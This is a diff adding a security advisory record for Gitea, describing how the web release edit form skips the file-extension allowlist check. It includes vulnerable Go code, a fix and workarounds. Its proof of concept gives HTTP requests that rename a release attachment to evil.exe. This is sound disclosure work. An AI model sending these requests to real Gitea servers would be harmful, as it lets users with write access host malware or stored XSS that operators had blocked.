@@ -1,0 +1,65 @@
+{
+  "id": "GHSA-25gq-j9jx-43pg",
+  "modified": "2026-07-21T20:30:32.951761058Z",
+  "published": "2026-07-21T20:18:44Z",
+  "aliases": [
+    "CVE-2026-58428"
+  ],
+  "summary": "Gitea: Release attachment extension allowlist bypass via web release edit form (variant of CVE-2025-68939)",
+  "details": "## Summary\n\nThe web handler `EditReleasePost` (`routers/web/repo/release.go`) reads form fields with prefix `attachment-edit-{uuid}` into a `map[uuid]newName`, passes that map to `release_service.UpdateRelease`, which writes the new name to the database via `repo_model.UpdateAttachmentByUUID` WITHOUT calling `upload.Verify` against `setting.Repository.Release.AllowedTypes`. The parent CVE-2025-68939 fix (PR #32151) added the equivalent `upload.Verify` call on the API edit endpoints via `attachment_service.UpdateAttachment`. The web release edit path was not updated.\n\nA user with repository write permission can rename any existing release attachment to a name with a forbidden extension via the web release edit form, bypassing the operator-configured allowlist.\n\n## Details\n\n### Vulnerable code\n\n`routers/web/repo/release.go:597` `EditReleasePost`:\n\n```go\nconst editPrefix = \"attachment-edit-\"\neditAttachments := make(map[string]string)\nif setting.Attachment.Enabled {\n    for k, v := range ctx.Req.Form {\n        if strings.HasPrefix(k, editPrefix) {\n            editAttachments[k[len(editPrefix):]] = v[0]\n        }\n    }\n}\n...\nif err = release_service.UpdateRelease(ctx, ctx.Doer, ctx.Repo.GitRepo,\n    rel, addAttachmentUUIDs, delAttachmentUUIDs, editAttachments); err != nil {\n    ctx.ServerError(\"UpdateRelease\", err)\n    return\n}\n```\n\n`services/release/release.go:321` -- the unvalidated write:\n\n```go\nfor uuid, newName := range editAttachments {\n    if !deletedUUIDs.Contains(uuid) {\n        if err = repo_model.UpdateAttachmentByUUID(ctx, \u0026repo_model.Attachment{\n            UUID: uuid,\n            Name: newName,\n        }, \"name\"); err != nil {\n            return err\n        }\n    }\n}\n```\n\nNo `upload.Verify(nil, newName, setting.Repository.Release.AllowedTypes)` before the database write.\n\n### Comparison: the parent fix on the API path\n\n`routers/api/v1/repo/release_attachment.go:341` (patched in PR #32151):\n\n```go\nif err := attachment_service.UpdateAttachment(ctx,\n        setting.Repository.Release.AllowedTypes, attach); err != nil {\n    if upload.IsErrFileTypeForbidden(err) {\n        ctx.Error(http.StatusUnprocessableEntity, \"\", err)\n        return\n    }\n    ctx.Error(http.StatusInternalServerError, \"UpdateAttachment\", attach)\n    return\n}\n```\n\nDelegates to:\n\n```go\n// services/attachment/attachment.go:96\nfunc UpdateAttachment(ctx context.Context, allowedTypes string, attach *repo_model.Attachment) error {\n    if err := upload.Verify(nil, attach.Name, allowedTypes); err != nil {\n        return err\n    }\n    return repo_model.UpdateAttachment(ctx, attach)\n}\n```\n\nThe API path goes through `attachment_service.UpdateAttachment` which calls `upload.Verify(nil, attach.Name, allowedTypes)`. The web path bypasses this entirely.\n\n## Proof of Concept\n\nTested live against:\n* Gitea `v1.26.1` community edition, Linux amd64, SQLite, Go 1.26.2\n* `app.ini` includes `[repository.release] ALLOWED_TYPES = .zip,.tar.gz`\n* Two users: `admin` (superuser, created via `gitea admin user create --admin`), `bob` (regular, repo owner of `bob/test-repo`)\n\n**Step 1**: bob creates release v0.1 and uploads `innocent.zip` (allowlist compliant) via the API.\n\n**Step 2**: Sanity. The patched API edit endpoint rejects a rename to a forbidden extension.\n\n```http\nPATCH /api/v1/repos/bob/test-repo/releases/1/assets/1 HTTP/1.1\nAuthorization: token \u003cbob_token\u003e\nContent-Type: application/json\n\n{\"name\":\"evil.exe\"}\n```\n\nResponse: `HTTP 422` -- \"This file cannot be uploaded or modified due to a forbidden file extension or type.\" (parent CVE-2025-68939 fix in action).\n\n**Step 3**: The attack. The web release edit form does NOT enforce the allowlist.\n\n```http\nPOST /bob/test-repo/releases/edit/v0.1 HTTP/1.1\nCookie: i_like_gitea=\u003csession\u003e; lang=en-US\nContent-Type: application/x-www-form-urlencoded\n\ntag_name=v0.1\n\u0026tag_target=main\n\u0026title=rename+payload\n\u0026content=\n\u0026attachment-edit-\u003cexisting_attachment_uuid\u003e=evil.exe\n```\n\nResponse: `HTTP 303 -\u003e /bob/test-repo/releases`. The form is accepted with no validation error.\n\n**Step 4**: Verify.\n\n```http\nGET /api/v1/repos/bob/test-repo/releases/1/assets/1 HTTP/1.1\n```\n\nResponse includes `\"name\": \"evil.exe\"`. The download link `/attachments/\u003cuuid\u003e` now serves the file under the forbidden extension.\n\nA self contained Python PoC ships with this advisory: `GITEA-R007_release_edit_extension_bypass.py`. End to end run:\n\n[GITEA-R007_release_edit_extension_bypass.py](https://github.com/user-attachments/files/27739265/GITEA-R007_release_edit_extension_bypass.py)\n\n```\n[+] Logged in as bob\n[+] Pre-attack attachment name: 'innocent2.zip'\n[+] API endpoint correctly rejects rename: HTTP 422 (parent CVE-2025-68939 fix)\n[+] POST release edit: HTTP 303 -\u003e /bob/test-repo/releases\n[+] Post-attack attachment name: 'pwn.exe'\n\n[!!!] CONFIRMED: web release edit bypasses Release.AllowedTypes allowlist.\n```\n\n## Impact\n\nSame impact class as the parent CVE-2025-68939 (HIGH, CVSS 8.2):\n\n* Pre-condition: operator has set `Repository.Release.AllowedTypes` to a non-empty allowlist (a reasonable hardening posture when restricting release uploads).\n* Threat actor: user holding repository write permission. In most Gitea deployments this is the repo owner, organization members, or invited collaborators.\n* Effect: bypass the allowlist; an attachment uploaded under an allowed extension is renamed to a forbidden extension (.exe, .html, .svg, .js, ...) and served by Gitea under that name.\n* Practical impact:\n  * Distribute malware files (e.g., `.exe`, `.dmg`, `.msi`, `.apk`) masquerading as a tagged release attachment\n  * If Gitea serves attachments with inline rendering (HTML, SVG), the renamed file hosts stored XSS against the Gitea origin\n  * Operator hardening intent (the allowlist) is silently defeated, with no audit trail beyond the regular release-edit event\n\n## Suggested remediation\n\nMirror the parent CVE-2025-68939 fix into the web release edit path. In `services/release/release.go UpdateRelease`, verify each new name against the configured allowlist before persisting:\n\n```go\nimport (\n    \"code.gitea.io/gitea/modules/setting\"\n    \"code.gitea.io/gitea/services/context/upload\"\n)\n\n// inside UpdateRelease, replace the editAttachments loop:\nfor uuid, newName := range editAttachments {\n    if deletedUUIDs.Contains(uuid) {\n        continue\n    }\n    if err := upload.Verify(nil, newName, setting.Repository.Release.AllowedTypes); err != nil {\n        return err\n    }\n    if err = repo_model.UpdateAttachmentByUUID(ctx, \u0026repo_model.Attachment{\n        UUID: uuid,\n        Name: newName,\n    }, \"name\"); err != nil {\n        return err\n    }\n}\n```\n\nThe web handler `EditReleasePost` should map `IsErrFileTypeForbidden` to a 422 response (or equivalent flash error and form re-render) to match the API behavior.\n\nAlternative: refactor `attachment_service.UpdateAttachment` to accept a UUID (or expose a `UpdateAttachmentByUUID` variant in the service layer) and have the release service call that instead of the raw model function.\n\n## Workaround for operators (no Gitea change required)\n\nUntil a patched release lands, operators can mitigate by either:\n\n1. Removing the `Repository.Release.AllowedTypes` allowlist (accept any extension) -- this eliminates the bypass but also removes the defense, so it is only a holding move.\n2. Putting Gitea behind a reverse proxy that rewrites or strips suspicious `attachment-edit-*` form fields on POST to `/\u003cowner\u003e/\u003crepo\u003e/releases/edit/*` -- viable but operationally fragile.\n3. Restricting who has Write permission on repositories with a configured release allowlist -- in single-tenant deployments this may be acceptable.\n\nA vendor patch is the right answer; the workarounds above are stopgaps.\n\n## Credit\n\nJose Rivas (bl4cksku111.com)\n\n## References\n\n* Parent advisory: https://github.com/advisories/GHSA-263q-5cv3-xq9g (CVE-2025-68939)\n* Parent fix: PR https://github.com/go-gitea/gitea/pull/32151 (commit `7adc4717ec`)\n* CWE-424: https://cwe.mitre.org/data/definitions/424.html\n* CWE-434: https://cwe.mitre.org/data/definitions/434.html",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.gitea.io/gitea",
+        "purl": "pkg:golang/code.gitea.io/gitea"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.27.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-25gq-j9jx-43pg/GHSA-25gq-j9jx-43pg.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-25gq-j9jx-43pg"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/pull/38406"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/pull/38426"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/commit/de4b8277e9cb576f2315fb03b5ab6478b42a1d31"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/commit/f69e15afe7496cc62e96dab244629c69eb31a7bf"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-gitea/gitea"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/releases/tag/v1.27.0"
+    }
+  ]
+}
